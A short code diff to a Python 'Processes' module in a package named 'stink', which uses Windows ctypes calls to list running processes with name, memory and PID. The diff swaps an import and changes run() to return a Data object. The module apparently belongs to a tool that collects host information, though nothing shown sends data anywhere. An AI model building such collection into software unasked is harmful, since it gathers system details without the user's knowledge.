@@ -3,7 +3,8 @@ from typing import List
 from ctypes.wintypes import DWORD
 from ctypes import windll, sizeof, byref, create_unicode_buffer
 
-from stink.helpers import functions, ProcessEntry32, ProcessMemoryCountersEx, MemoryStorage
+from stink.helpers.dataclasses import Data
+from stink.helpers import functions, ProcessMemoryCountersEx, MemoryStorage
 
 
 class Processes:
@@ -66,7 +67,7 @@ class Processes:
             "\n".join(line for line in functions.create_table(["Name", "Memory", "PID"], self.get_processes_list()))
         )
 
-    def run(self) -> List:
+    def run(self) -> Data:
         """
         Launches the processes collection module.
 
